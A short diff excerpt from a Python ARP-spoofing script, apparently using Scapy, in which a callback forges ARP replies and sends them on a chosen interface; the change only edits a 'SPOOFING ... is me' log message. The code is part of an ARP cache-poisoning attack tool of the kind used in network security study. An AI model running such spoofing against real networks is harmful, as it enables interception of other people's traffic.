@@ -15,7 +15,7 @@ def arp_poison_callback(packet):
 		answer[ARP].psrc = packet[ARP].pdst
 		answer[ARP].pdst = packet[ARP].psrc
 
-		print("SPOOFING " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me...")
+		print("SPOOFING " + packet[ARP].psrc + " MAC " + packet[ARP].pdst + " is me...")
 
 		sendp(answer, iface=sys.argv[1])
 
